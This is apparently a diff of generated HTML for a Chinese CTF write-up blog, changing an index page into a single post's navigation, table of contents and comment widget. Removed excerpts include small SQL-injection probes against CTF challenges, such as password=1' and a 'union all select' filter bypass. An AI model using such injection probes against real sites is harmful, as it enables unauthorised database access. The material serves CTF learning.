-          <a   href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/#more">查看更多 >></a>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
         </p>
-      
-      <div class="clearfix"></div>
     </div>
-    
-  </div>
+
+
+
+<nav id="article-nav">
   
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-网鼎杯-2018-Fakebook" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/" class="article-date">
-      <time datetime="2021-04-05T06:23:57.000Z" itemprop="datePublished">2021-04-05</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <a  href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">(网鼎杯 2018)Fakebook</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>join创建一个账号，登录，在这个页面存在sqli</p>
-<p><code>/view.php?no=1</code></p>
-<p>过滤了<code>union select</code>，使用<code>union all select</code>可以</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF-sqli/" rel="tag">SSRF,sqli</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-VNCTF-2021-realezjvav" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/04/04/VNCTF-2021-realezjvav/" class="article-date">
-      <time datetime="2021-04-04T06:14:24.000Z" itemprop="datePublished">2021-04-04</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+          CISCN 2021 web 部分wp
         
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/04/04/VNCTF-2021-realezjvav/">VNCTF 2021 realezjvav</a>
-    </h1>
   
+    <a  href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SSRF之gopher协议利用</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
 
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="0x01-第一关sql注入"><a href="#0x01-第一关sql注入" class="headerlink" title="0x01 第一关sql注入"></a>0x01 第一关sql注入</h3><p>没有查询的回显，只有一个<code>Only the admin can get the right page</code>提示，应该是需要以admin身份登录，所以需要注入获得密码</p>
-<p>尝试报错， 提交<code>username=admin&amp;password=1&#39;</code>返回<code>500 Internal Server Error</code></p>
-<p>提交<code>username=admin&amp;password=1#&#39;</code>回显正常，证明sql语句报错会直接返回<code>500 Internal Server Error</code></p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java-web%EF%BC%8Csqli/" rel="tag">java web，sqli</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/04/04/VNCTF-2021-realezjvav/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
   
 </article>
 
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E7%8E%B0php%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">0x01 反序列化漏洞利用实现php任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%BB%95%E8%BF%87disable-functions%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">0x02 绕过disable_functions实现命令执行</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
 
 
 
 
 
 
-
-
-
-
-  
-    <article id="post-GXYCTF2019-禁止套娃" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" class="article-date">
-      <time datetime="2021-03-10T12:29:49.000Z" itemprop="datePublished">2021-03-10</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
     
-      <input type="hidden" class="isFancy" />
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
     
-    
-      <header class="article-header">
+
+
+
+    <div class="scroll" id="post-nav-button">
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>.git源码泄露，利用工具下载源码</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">php代码审计</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-RoarCTF-2019-Easy-Calc" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/03/10/RoarCTF-2019-Easy-Calc/" class="article-date">
-      <time datetime="2021-03-10T06:46:42.000Z" itemprop="datePublished">2021-03-10</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+            <a  href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/" title="上一篇: CISCN 2021 web 部分wp">
+                <i class="fa fa-angle-left"></i>
+            </a>
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="0x01-php变量解析漏洞"><a href="#0x01-php变量解析漏洞" class="headerlink" title="0x01 php变量解析漏洞"></a>0x01 php变量解析漏洞</h3><p>起因是get,post或其他方法获取来的变量如果不符合php的变量规则，php会对其进行适当的转换，更改为符合规则的变量名。主要是将某些字符删除或者替换成下划线。接下来看一下主要是哪些字符会引发这个操作</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%B6%E4%BB%96/" rel="tag">其他</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/03/10/RoarCTF-2019-Easy-Calc/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Http请求走私学习记录" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-date">
-      <time datetime="2021-02-12T09:29:20.000Z" itemprop="datePublished">2021-02-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Http请求走私（smuggling)学习记录</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="HTTP-smuggling-请求夹带攻击（请求走私）学习记录"><a href="#HTTP-smuggling-请求夹带攻击（请求走私）学习记录" class="headerlink" title="HTTP smuggling 请求夹带攻击（请求走私）学习记录"></a>HTTP smuggling 请求夹带攻击（请求走私）学习记录</h2><p>网站处理从一个或多个用户接收的HTTP请求序列有一定的方式，利用请求夹带技术，我们可以去干扰网站处理请求</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http-smugglings/" rel="tag">http smugglings</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Http请求走私-WebSecurityAcademy实验室" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/" class="article-date">
-      <time datetime="2021-02-12T09:29:05.000Z" itemprop="datePublished">2021-02-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+            <a  href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/" title="下一篇: SSRF之gopher协议利用">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">WebSecurityAcademy实验室-Http请求走私</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="0x01-basic-CL-TE-vulnerability"><a href="#0x01-basic-CL-TE-vulnerability" class="headerlink" title="0x01  basic CL.TE vulnerability"></a>0x01  basic CL.TE vulnerability</h3><p>实验描述</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png"></p>
-          
-      
     </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/">CISCN 2021 web 部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/">蓝帽杯-One Pointer PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">SSRF之gopher协议利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/">DASCTF 三月赛 web题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">(网鼎杯 2018)Fakebook</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/04/VNCTF-2021-realezjvav/">VNCTF 2021 realezjvav</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Http请求走私（smuggling)学习记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">WebSecurityAcademy实验室-Http请求走私</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/08/HGAME-week1-web%E9%83%A8%E5%88%86/">HGAME week1 web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">极客大挑战 2019 Http</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/">极客大挑战 2019 PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/24/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/">安洵杯 2019 easy_serialize_php</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/20/BJDCTF2020-Easy-MD5/">BJDCTF2020 Easy MD5</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">CISCN2019 华北赛区 Day2 Web1 Hack World</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/">极客大挑战 2019 BabySQL</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/14/HCTF-2018-Warmup/">HCTF 2018 Warmup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a></li></ul>
     
-    <div class="article-info article-info-index">
-      
-      
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http-smuggling/" rel="tag">http smuggling</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
 
 
 
 
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
-  
+    <script>
+        
+    </script>
 
 </div>
       <footer id="footer">
